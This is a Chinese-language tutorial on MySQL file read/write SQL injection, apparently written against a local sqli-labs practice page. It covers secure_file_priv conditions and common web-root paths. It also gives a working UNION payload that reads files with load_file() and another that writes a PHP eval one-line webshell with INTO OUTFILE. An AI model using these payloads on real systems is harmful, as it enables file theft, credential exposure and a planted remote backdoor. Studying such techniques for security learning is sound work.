# 

# SQL注入—文件读写注入

## 读写注入的原理

利用文件的读写权限进行注入，它可以写入一句话木马，也可以读取系统文件的敏感信息。

​	

## 文件读写注入的条件

高版本的 MySQL 添加了一个新的特性：`secure_file_priv` 系统变量，该变量限制了 MySQL 导出文件的权限。

### `secure_file_priv` 变量的路径：

- Linux：`cat etc/conf`
- Windows：`www/mysql/my.ini`

​	

### 查看 MySQL 全局变量的配置：

(在 MySQL 数据库中输入)

```mysql
show global variables like '%secure%';
```

​	

### 文件读写注入的条件：

1、读写文件需要 `secure_file_priv` 权限

- `secure_file_priv=''`：代表对文件读写没有限制
- `secure_file_priv=NULL`：代表不能进行文件读写
- `secure_file_priv=d:/phpstudy/mysql/data`：代表只能对该路径下文件进行读写
> 在 MySQL 5.5 之前 `secure_file_priv` 默认为空
> 在 MySQL 5.5 之后 `secure_file_priv` 默认为 NULL

​	

2、知道网站绝对路径

Windows 常见的绝对路径：

- phpstudy: `phpstudy/www`  `phpstudy/PHPTutorial/www`
- Xampp: `xampp/htdocs`
- Wamp: `wamp/www`
- Appser: `appser/www`

Linux 常见的绝对路径：

- `/var/mysql/data`
- `/var/www/html`

​	

路径获取常见方式：

- 报错显示
- 遗留文件
- 漏洞报错
- 平台配置文件等

​	

## 读取文件

使用函数：`load_file()`

后面的路径可以是单引号，0x，char 转换的字符。

注意：路径中斜杠是 `/` 不是 `\`

一般可以在联合查询中做为一个字段使用，查看 config.php (即 MySQL 的密码)，apache 配置...

```mysql
#读取路径下的某个文件并返回结果
http://127.0.0.1/mysql/Less-1/?id=-1' union select 1,2,load_file('c:/users/wutongliran/desktop/2.txt') --+
```

​	

## 写入文件

使用函数：

- `into outfile`：能写入多行，按格式输出
- `into dumpfile`：只能写入一行且没有输出格式

`into outfile` 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径

```mysql
#将木马写入指定位置
http://127.0.0.1/mysql/Less-1/?id=-1' union select 1,'<?php eval($_REQUEST[wtlr]); ?>',3 into outfile 'D://1.php'--+
```


